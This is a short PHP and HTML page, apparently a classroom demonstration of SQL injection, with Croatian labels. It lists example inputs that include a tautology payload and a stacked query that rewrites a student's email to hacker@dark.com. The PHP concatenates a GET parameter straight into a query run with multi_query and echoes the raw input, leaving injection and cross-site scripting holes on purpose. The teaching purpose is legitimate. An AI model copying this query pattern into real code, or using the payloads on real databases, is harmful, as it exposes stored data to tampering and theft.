<!DOCTYPE html>
<html>
  <head>
    <title>TODO supply a title</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body>
    <div>  
      Za hakiranje unesi <textarea name="haker" rows="4" cols="30">' OR 'x'='x</textarea> <br>
      za ispravno unesi 
      <textarea name="haker" rows="4" cols="30">adrian.lukac@algebra.hr</textarea>
za hakirati email adresu unesi: 
      <textarea name="haker" rows="4" cols="30">' AND email IS NULL; UPDATE stud SET email='hacker@dark.com' WHERE email LIKE 'adrian.lukac@algebra.hr';--'</textarea>
      
      
    </div>  

    <div>
      <form method="GET" action="https://www.google.hr/search?q=test">
        unesi email adresu:
        <input type="text" name="email">
        <input type="submit" name="submit" value="submit_email">
      </form>      
    </div>
  </body>
</html>
<?php
include_once './mysqli_connection.php';
if (isset($_GET['submit'])) {
  echo "forma je submitana" . '<br>';
  echo $_GET['email'] . '<br>';

  $query = "SELECT * FROM stud where stud.email like '" . $_GET['email'] . "'";
  echo $query . '<br>';

  if ($result = $mysqli->multi_query($query)) {
    if ($result = $mysqli->store_result()) {
      while ($row = $result->fetch_assoc()) {
        var_dump($row);
        echo $row['prezStud'] . ' ' . $row['imeStud'];
        echo '<br>';
      }
      $result->free();
    }
  } else {
    echo mysqli_error($mysqli);
  }
}


